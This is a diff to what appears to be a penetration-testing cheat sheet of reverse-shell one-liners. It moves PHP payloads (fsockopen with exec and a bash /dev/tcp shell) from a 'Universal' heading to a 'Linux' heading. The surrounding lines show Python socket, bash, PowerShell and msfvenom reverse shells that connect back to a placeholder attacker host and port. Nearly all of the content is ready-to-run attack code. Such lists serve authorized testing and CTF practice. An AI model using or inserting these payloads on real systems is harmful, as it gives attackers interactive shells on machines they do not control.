@@ -43,13 +43,6 @@ msfvenom --payload $payload LHOST=$hip LPORT=$hport --format psh | msfvenom --pa
 ```
 ## Universal
 
-PHP (`php -r ''` or `<?php payload ?>)
-```php
-$sock=fsockopen("$hip",$hport);exec("/bin/sh -i <&3 >&3 2>&3");
-```
-```php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/$hip/$hport 0>&1'");
-```
 Python (`python -c ''`)
 ```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$hip",$hport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
@@ -92,7 +85,13 @@ powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClie
 
 
 ## Linux
-
+PHP (`php -r ''` or `<?php payload ?>)
+```php
+$sock=fsockopen("$hip",$hport);exec("/bin/sh -i <&3 >&3 2>&3");
+```
+```php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/$hip/$hport 0>&1'");
+```
 Bash
 ```bash
 bash -i >& /dev/tcp/$hip/$hport 0>&1
